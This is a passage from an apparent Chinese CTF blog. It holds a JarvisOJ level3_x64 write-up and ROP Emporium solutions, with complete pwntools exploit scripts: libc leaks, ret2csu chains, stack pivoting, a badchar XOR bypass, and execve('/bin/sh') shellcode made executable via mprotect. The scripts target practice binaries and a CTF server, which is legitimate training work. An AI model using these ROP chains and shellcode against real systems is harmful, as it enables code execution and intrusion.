addr这个只有在极少数情况下才不为0，这个参数告诉内核使用addr指定的值来映射指定文件。当指定为0的时候，告诉内核返回什么地址内其自身决定。除非非常了解系统进程模式，或者对当前环境非常了解，否则的话手工指定这个值总是不可取。参数 len指定被映射的内存区域的长度。参数 port这个参数对应open函数的权限位，我们可以指定为：PROT_READ，映射区可读；PROT_WRITE，映射区可写；PROT_EXEC，映射区可执行；PROT_NONE，映射区不可访问。由于只能映射已经打开的文件，所以这个权限位不能超出open函数指定的权限，比如说在open的时候指定为只读，那就不能在此时指定PORT_WRITE。参数 flag这个参数指定了映射区的其它一些属性，权限的属性已经在port中指定。这里可能存在的典型值有：MAP_FIXED，针对addr属性，如果指定这个位，那么要求系统必需在指定的地址映射，这往往是不可取的；MAP_SHARED，此标志说明指定映射区是共享的，意思就是说对内存的操作与对文件的操作是相对应的，它不能与MAP_PRIVATE标志一直使用，因为它们表达的意图是相反的；MAP_PRIVATE，该标志说明映射区是私用的，此时被映射的内存只能被当前里程使用，当进程操作的内存将会产生原文件的一个副本。 mprotect 函数可以更改一个已经存在的映射区的访问权限。 1234#include&lt;sys/mman.h&gt;int mprotect(void* addr, size_t len, int port)返回值：成功返回0，失败返回-1 参数 addr这个参数是mmap返回的数值，此时它就是mprotect作用的范围。参数 len指定映射区的长度，它需要与mmap中指定相同。参数 port在上面我们已经介绍了port的可能取值，mprotect功能就是把这个port指定的属性施加于相应的映射区上。 好，我们来看题 开了NX既然题目有提示一个更改权限的函数，那我们就去看一下bss段的权限，应该是禁止执行了的 readelf -S先找到bss的地址 vmmap查看权限，bss段的地址为0x600a88 ，在0x600000-0x601000之间，不可执行 思路：（1）先通过write函数leak出write（也可以是其他）的真实地址（2）找到mprotect的真实地址（3）将shellcode写入bss段（4）调用mprotect将bss段权限更改（5）调用bss，getshell 第一段的代码：（leak write_addr，found mprotect_addr） 第二段（shellcode写入bss） 第三段（找两个空的got地址，将mprotect和bss写入方便调用） 最后就直接通过csu调用bss段就可以getshell了，（很奇怪的是本地get不到，远程可以） 两种方法的exp第一种（写个函数，直接调用） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = "debug"sh=remote('pwn2.jarvisoj.com',9884)#sh = process('./level3_x64')elf =ELF('./level3_x64')libc = ELF('./libc-2.19.so')vul = elf.symbols['vulnerable_function']#read_plt = elf.symbols['read']read_got = elf.got['read']read_libc = libc.symbols['read']mprotect_libc = libc.symbols['mprotect']write_libc = libc.symbols["write"]write_got = elf.got['write']#write_plt = elf.plt['write']#bss = 0x0600A88bss = elf.bss()#gadgetpop5_addr = 0x04006A6mov_call = 0x0400690 bss_got = 0x0600A48mprotect_got = 0x0600A50def csu(r12,r13,r14,r15,data=False): data_num='' payload = "a"*0x88 payload += p64(pop5_addr)+p64(0)+p64(0)+p64(1)+p64(r12)+p64(r13)+p64(r14)+p64(r15) payload += p64(mov_call)+"a"*0x38 payload += p64(vul) sh.recvuntil("Input:\n") sh.send(payload) if data==True: data_num = u64(sh.recv(8)) return data_numread_addr = csu(write_got,8,read_got,1,True)mprotect_addr = read_addr - read_libc + mprotect_libcprint "mprotect_addr:" + hex(mprotect_addr)read_got = elf.got['read']bss = elf.bss()shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'csu(read_got,len(shellcode),bss,0)sh.send(shellcode)mprotect_got = 0x0600A50csu(read_got,8,mprotect_got,0)sh.send(p64(mprotect_addr))csu(mprotect_got,7,0x1000,0x600000)bss_got = 0x0600A48csu(read_got,8,bss_got,0)sh.send(p64(bss))csu(bss_got,0,0,0)sh.interactive() 第二种（用pop rdi，rsi，rdx来存参） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh =remote('pwn2.jarvisoj.com',9884)#sh = process('./level3_x64')elf = ELF("./level3_x64")libc = ELF("./libc-2.19.so")#write_plt = 0x04004B0write_plt = elf.plt["write"]write_got = elf.got["write"]vul = elf.symbols["vulnerable_function"]#bss = 0x0600A88bss_base = elf.bss()read_plt = elf.symbols["read"]read_got = elf.got["read"]write_libc = libc.symbols["write"]mprotect_libc = libc.symbols["mprotect"]#gadgetpop_rdi = 0x00000000004006b3 #the first parameterpop_rsi_rdx = 0x00000000004006b1 #the second and third pop5_addr = 0x00000000004006A6mov_call = 0x0000000000400690 #distence 0x1apayload1 = "a"*0x80 + p64(0)payload1 += p64(pop_rdi)+p64(1)+p64(pop_rsi_rdx)+p64(write_got)+p64(0)+p64(write_plt)+p64(vul)sh.recv()sleep(0.2)sh.send(payload1)data = sh.recv(8)write_addr = u64(data)libc_dis = write_addr - libc.symbols["write"]mprotect_addr = libc_dis + libc.symbols["mprotect"]read_plt = elf.symbols["read"]bss_base = elf.bss()pop_rdi = 0x00000000004006b3 #the first parameterpop_rsi_rdx = 0x00000000004006b1 #the second and third #shellcode = asm(shellcraft.sh())shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'payload2 = "a"*0x80 + p64(0)payload2 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_base)+p64(0)+p64(read_plt)+p64(vul)sleep(0.2)sh.send(payload2)sleep(0.2)sh.send(shellcode)bss_got = 0x0000000000600A48payload4 = "a"*0x80 + p64(0)payload4 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_got)+p64(0)+p64(read_plt)+p64(vul)sleep(0.2)sh.send(payload4)sleep(0.2)sh.send(p64(bss_base)) mprotect_got = 0x0000000000600A50payload3 = "a"*0x80 +p64(0)payload3 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(mprotect_got)+p64(0)+p64(read_plt)+p64(vul)sleep(0.2)sh.send(payload3)sleep(0.2)sh.send(p64(mprotect_addr))pop_rdi = 0x00000000004006b3 #the first parameterpop_rsi_rdx = 0x00000000004006b1 #the second and third payload5 = 'a'*0x80+p64(0)payload5 += p64(pop5_addr) + p64(0) + p64(0) + p64(1) +p64(mprotect_got) + p64(7) +p64(0x1000)+p64(0x600000)payload5 +=p64(mov_call) payload5 += 'a'*8 + p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)payload5 += p64(mov_call)sleep(0.2)sh.send(payload5)sh.interactive()` 权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限找了一下午的bug，代码改得有点乱（终于cat到flag也是好心酸的）。]]></content>
  </entry>
  <entry>
    <title><![CDATA[ROP Emporium]]></title>
    <url>%2F2019%2F07%2F08%2FROP%20Emporium%2F</url>
    <content type="text"><![CDATA[这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。 1-ret2win12345678910111213# -*- coding:utf-8 -*-from pwn import *sh = process('./ret2win')shell=0x0400824bss = 0x0601060payload = 0x20*"a" + p64(0) + p64(shell)sh.sendline(payload)sh.interactive() 2-split12345678910111213# -*- coding:utf-8 -*-from pwn import *sh = process('./split')system = 0x04005E0cat_flag = 0x0601060bss = 0x0601080pop_rdi = 0x0400883payload = "a"*0x20 + p64(0) + p64(pop_rdi) + p64(cat_flag) + p64(system)sh.sendline(payload)sh.interactive() 3-callme题目意思大概是叫我们分别调用callme_one callme_two callme_three来得到flag，要想知道这些函数到底是干什么的还是要去.so文件里看一下具体的函数（其实主要是它竟然给了我们一个.so文件，那肯定不会没用啊，而且callme里对这三个函数就是一笔带过，啥都没写） so里的三个函数传的参都是1、2、3，意思就是我们要把这些参数压进栈内，然后调用callme的三个函数，但是貌似每次调用都要传参，才能调用到下一个函数，所以我们要pop三个寄存器出来存着三个数 然后找到rdi rsi rdx三个可以用的接下来上脚本 123456789101112131415161718# -*- coding:utf-8 -*-from pwn import *sh = process('./callme')callme_one = 0x0401850callme_two = 0x0401870callme_three = 0x0401810pop_rdi_rsi_rdx = 0x0401ab0 #wirte 1/2/3 in callmepayload = "a"*0x20 + p64(0)payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_one)payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_two)payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_three)sh.sendline(payload)sh.interactive() 32位不需要调用rdi来存放指令，但是它需要用到堆栈平衡，在调用函数之后的栈帧里，存的是它的返回地址，而后面是调用函数的参数。（这里就没写exp）但64位需要用到rdi，rsi，rdx来存参，参数在调用前进栈，存入相应位置。 4-write4首先，我们明确一下思路，是要将”/bin/sh”写入bss段里。借助pop 然后我们选那个r14、r15的地址然后还要去找mov的地址来给寄存器赋值的 然后我们找到有r14和r15的，[r14]是代表r14的地址，r15则是对应的值，假设r14地址为0x0401809，r15里的值是“abc”，则这个命令就是，让r14里的地址指向r15里的内容，即0x0401809-&gt;“abc”。 123456789101112131415161718# -*- coding:utf-8 -*-from pwn import *sh = process('./write4')system = 0x04005E0pop_rdi = 0x0400893 bss = 0x0601060pop_r14_r15 = 0x0400890 mov_r14_r15 = 0x0400820 payload = "a"*0x20+p64(0)payload += p64(pop_r14_r15) + p64(bss) + "/bin/sh\x00" + p64(mov_r14_r15) #save the /bin/sh into bsspayload += p64(pop_rdi) + p64(bss) + p64(system) #rdi-&gt;system bss is the x in systemsh.sendline(payload)sh.interactive() 5-badchars通过程序我们知道，它阻止了几个字符的输入，使个别字符强行转换成21（会影响“/bin/sh”的写入），所以我们要绕过它 最简单的加密解密方法就是异或了，我们来找一个数字，使输入异或之后不等于badchars即可，脚本如下 123456789101112131415161718# -*- coding: utf-8 -*-from pwn import *chars = [98,105,99,47,32,102,110,115]num = 1binsh = "/bin/sh\x00"while 1: for i in binsh: x = ord(i) ^ num if x in chars: num += 1 break if i == "\x00": print num num += 1 if num == 10: break 我们选用2然后我们就可以写exp了 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh = process('./badchars')binsh = "/bin/sh\x00"num = ""for x in binsh: num += chr(ord(x)^2)system = 0x04006F0 bss = 0x0601080 pop_rdi = 0x0400b39 mov_r12_r13 = 0x0400b34 pop_r12_r13 = 0x0400b3b #write num in bsspop_r14_r15 = 0x0400b40xor_r15_r14 = 0x0400b30 #back to binshpayload = "a" * 0x20 + p64(0)payload += p64(pop_r12_r13) + num + p64(bss) + p64(mov_r12_r13)#back to binshfor i in range(0,len(num)): payload += p64(pop_r14_r15) + p64(2) + p64(bss+i) payload += p64(xor_r15_r14)payload += p64(pop_rdi) + p64(bss) + p64(system)sh.sendline(payload)sh.interactive() 6-fluff这个和前面的write4有异曲同工之处，只不过这个程序没有那么多的mov，需要借助到xor（xor自身会清空，xor另一个数，就等于存值） 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *sh = process('./fluff')system = 0x04005E0bss = 0x0601060pop_rdi = 0x04008c3 pop_r12 = 0x04008bc#pop r12 ; pop r13 ; pop r14 ; pop r15 ; retxor_r11_r11 = 0x0400822# xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retxor_r11_r12 = 0x040082f# xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retxchg_r11_r10 = 0x0400840# xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; retmov_r10_r11 = 0x040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; retpayload = "a"*0x20 + p64(0)payload += p64(pop_r12) + p64(bss) + p64(0) + p64(0) + p64(0) payload += p64(xor_r11_r11) + p64(0) payload += p64(xor_r11_r12) + p64(0)payload += p64(xchg_r11_r10) + p64(0) payload += p64(pop_r12) + "/bin/sh\x00"+ p64(0) + p64(0) + p64(0) payload += p64(xor_r11_r11) + p64(0)payload += p64(xor_r11_r12) + p64(0) payload += p64(mov_r10_r11) + p64(0) + p64(0) payload += p64(pop_rdi) + p64(bss) + p64(system)sh.sendline(payload)sh.interactive() 7-pivot这个貌似有用到栈迁移的东西，这个程序有两个输入，第一个是写到堆里（它给出了堆的地址），第二个是写入到栈里。很明显第二次能输入的内容太少，所以payload写入堆里，然后在栈里调用。 .so里有一个后门函数，可以直接调用ret2win，cat到flag。而要leak真实地址的话要找两个文件都有的函数，貌似是只有foothold_function函数#函数需要经过一次调用之后got表里才会有真实地址 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh = process('./pivot')libc = ELF('./libpivot.so')foothold_function_so = libc.symbols['foothold_function']ret2win = libc.symbols['ret2win']foothold_function_plt = 0x0400850foothold_function_got = 0x0602048offest = ret2win - foothold_function_so#gadgetpop_rax = 0x0400b00mov_rax_addr = 0x0400b05pop_rbp = 0x0400900pop_rdi = 0x0400b73call_rax = 0x040098eadd_rax_rbp = 0x0400b09xchg_rax_rsp = 0x0400b02sh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")heap_addr = int(sh.recv(14),16)payload1 = p64(foothold_function_plt) + p64(pop_rax) + p64(foothold_function_got) + p64(mov_rax_addr)payload1 += p64(pop_rbp) + p64(offest) + p64(add_rax_rbp) + p64(call_rax)payload2 = "a"*0x20 + p64(0)payload2 += p64(pop_rax) + p64(heap_addr) + p64(xchg_rax_rsp)sh.recvuntil("&gt; ")sh.sendline(payload1)sh.recvuntil("&gt; ")sh.sendline(payload2)sh.recvuntil("into libpivot.so") #foothold_function() in libpivot.so print this sentencesh.interactive() 8-ret2csu1234567891011121314151617181920212223#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh = process('./ret2csu')gdb.attach(sh)system = 0x04005A0ret2win = 0x04007B1init = 0x0600E18 #self init/fini#gadget pop5_addr = 0x040089A #pop_rbx_rbp_r12_r13_r14_r15mov_call = 0x0400880 #mov rdx_r15 rsi_r14 edi_r13d call r12+rbp*8payload = "a"*0x20 + p64(0)payload += p64(pop5_addr) + p64(0) + p64(1) + p64(init) + p64(0) + p64(0) + p64(0xdeadcafebabebeef)payload += p64(mov_call) + "a"*56 + p64(ret2win)gdb.attach(sh,'b setvbuf')sh.sendline(payload)sh.interactive()]]></content>
  </entry>
</search>
